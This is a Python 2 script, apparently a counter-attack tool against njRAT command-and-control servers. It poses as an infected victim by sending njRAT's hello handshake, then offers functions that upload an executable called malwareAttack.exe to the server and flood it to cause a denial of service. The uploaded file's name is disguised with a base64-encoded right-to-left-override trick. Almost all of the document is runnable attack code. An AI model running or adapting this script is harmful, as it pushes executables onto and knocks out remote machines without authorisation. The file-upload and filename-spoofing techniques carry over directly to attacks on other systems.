# -*- coding: utf-8 -*-
# Configure the localIp, ccip and ccport
# At the end of this file select the attacks functions to use

import socket, os, base64, time
from urllib2 import urlopen
localip = '127.0.0.1'
#localip = urlopen('http://ip.42.pl/raw').read() # If attack use the public IP
ccip = 'thesuperc2.duckdns.org'
ccport = 2024
delimiter = "|'|'|"
campaign = "070707_242246B0"
b64filename = "4oCuZmRwLnZhZFBUTy5leGU="
pcname = "CONTABILIDAD-PC"
username = "dominio.local"
date = "18-03-18"
useros = "Win 7 Professional SP8 x64"
njversion = "0.7d"
window = "Internet Explorer"
file='./malwareAttack.exe'

print localip + " VS " + ccip
localport = 31337
size=os.path.getsize(file)
hello = "-"
def anounce(client):
  global hello
  hello_msg = []
  hello_msg.append("lv")
  hello_msg.append(str(base64.b64encode(campaign.encode())))
  hello_msg.append(pcname)
  hello_msg.append(username)
  hello_msg.append(date)
  hello_msg.append("") # Not sure what this field is for
  hello_msg.append(useros)
  hello_msg.append("No") # Cam. Yes-No
  hello_msg.append(njversion)
  hello_msg.append("..") # Initial value to put in ping column
  hello_msg.append(str(base64.b64encode(window.encode())))
  hello_msg.append("") # ','.join(md5(plugins modules))
  hello = delimiter.join(hello_msg)
  client.send(str(len(hello))+'\x00'+hello)
  print "Hello send :)"
  client.recv(2048)
def post(client):
  f=open(file,"rb")
  s=f.read(size)
  post_msg = []
  post_msg.append("post")
  post_msg.append(b64filename) # b64(filename)
  post_msg.append(str(size)) # File size
  post_msg.append(localip+':'+str(localport))
  post = delimiter.join(post_msg)
  client.send(str(len(post))+'\x00'+post)
  response = ""
  print "Post send, waiting for ok"
  response = client.recv(2048)
  if response == "ok":
    print "-"+response+"-"
    client.send(s)
    print "File sent"
    client.recv(2048)
  else:
    print "-" + response + "- received. Verify the delimiter: " + delimiter
def attack1():
  global localport#, localip
  print "\nATTACK: Send "+file+" without userFolder"
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((ccip, ccport))
  (localip,localport) = client.getsockname()
  print "Using "+localip+":"+str(localport)
  post(client)
  time.sleep(1)
  client.close()
def attack2():
  global localport#, localip
  print "\nATTACK: Send "+file+" user "+username
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((ccip, ccport))
  (localip,localport) = client.getsockname()
  print "Using "+localip+":"+str(localport)
  anounce(client)
  time.sleep(1)
  post(client)
  client.close()
def attack3():
  print "\nATTACK: Cause DoS"
  time.sleep(10)
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((ccip, ccport))
  #anounce(client) # Uncomment if attack2() is not used before
  for i in range(2):
    client.send(str(len(hello))+'\x00'+hello)
  client.close()
  print "KO"

#attack1()
#attack2()
#attack3() # Uncomment anounce() if attack2 is not used before
